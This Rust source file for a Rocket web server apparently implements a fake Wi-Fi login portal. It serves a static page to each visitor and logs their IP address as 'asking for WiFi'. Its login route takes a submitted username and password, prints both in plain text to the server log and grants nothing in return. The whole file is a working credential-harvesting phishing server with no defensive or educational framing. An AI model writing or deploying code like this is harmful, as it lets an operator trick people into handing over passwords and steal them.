#![feature(proc_macro_hygiene, decl_macro)]

#[macro_use]
extern crate rocket;

extern crate rocket_client_addr;

use rocket::request::Form;
use rocket::response::NamedFile;
use rocket_client_addr::ClientAddr;
use std::io;

#[get("/")]
fn index(client_addr: ClientAddr) -> io::Result<NamedFile> {
    let addr = client_addr.get_ipv4().unwrap();
    eprintln!("{} is asking for WiFi.", addr);
    NamedFile::open("static/index.html")
}

#[derive(FromForm)]
struct LoginInfo {
    username: String,
    password: String,
}

#[post("/login", data = "<user>")]
fn login(user: Option<Form<LoginInfo>>, client_addr: ClientAddr) -> &'static str {
    let addr = client_addr.get_ipv4().unwrap();
    match user {
        None => eprintln!("none"),
        Some(info) => eprintln!("name: {}, password: {}", info.username, info.password),
    }
    "login"
}

fn main() {
    rocket::ignite().mount("/", routes![index, login]).launch();
}
